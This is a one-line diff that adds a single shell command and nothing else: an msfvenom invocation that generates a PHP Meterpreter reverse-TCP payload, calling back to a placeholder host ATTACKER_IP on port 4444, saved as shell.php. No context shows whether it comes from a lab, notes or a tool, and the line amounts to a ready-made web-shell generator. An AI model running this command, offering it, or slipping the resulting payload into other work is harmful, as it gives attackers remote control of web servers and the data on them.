@@ -1,0 +1,1 @@
+msfvenom -p php/meterpreter_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.php
